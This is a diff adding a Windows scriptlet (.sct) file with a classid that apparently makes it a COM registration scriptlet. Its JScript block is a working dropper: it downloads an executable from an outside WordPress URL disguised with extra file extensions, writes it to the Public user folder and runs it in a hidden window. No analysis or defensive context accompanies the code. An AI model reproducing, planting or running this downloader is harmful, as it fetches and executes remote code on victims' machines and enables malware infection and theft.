@@ -1,0 +1,24 @@
+<scriptlet>
+  <registration
+    progid="Test"
+    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}">
+    <script language="JScript">
+      <![CDATA[
+        var url = "https://wahanadata.co.id/wp-content/mind/trymyng.exe.esta.env";
+        var path = "C:\\Users\\Public\\trymyng.exe";
+
+        var x = new ActiveXObject("MSXML2.XMLHTTP");
+        x.Open("GET", url, false);
+        x.Send();
+
+        var stream = new ActiveXObject("ADODB.Stream");
+        stream.Type = 1;
+        stream.Open();
+        stream.Write(x.ResponseBody);
+        stream.SaveToFile(path, 2);
+
+        (new ActiveXObject("WScript.Shell")).Run(path, 0, false);
+      ]]>
+    </script>
+  </registration>
+</scriptlet>
